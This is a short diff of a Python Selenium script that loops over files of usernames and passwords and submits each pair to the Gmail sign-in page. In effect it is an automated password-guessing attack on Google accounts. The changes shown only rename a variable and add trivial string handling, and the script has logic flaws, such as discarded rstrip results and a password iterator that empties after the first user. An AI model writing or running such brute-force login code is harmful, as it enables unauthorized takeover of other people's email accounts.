@@ -18,10 +18,11 @@ browser.get(link)
 #open user and password files
 passkeys= open("passwords.txt")
 
-with open("usernames.txt") as emails:
-    for line in emails:
+with open("usernames.txt") as users:
+    for line in users:
         line.rstrip()
         for line2 in passkeys:
+            line2.rstrip()
             userString = "%s@gmail.com" %(line)
             passString = line2.rstrip()
             # find HTML elements by their id and fill in corresponding values
@@ -34,3 +35,5 @@ with open("usernames.txt") as emails:
             signInButton = browser.find_element_by_id('signIn')
             signInButton.click()
             time.sleep(5)
+
+#add
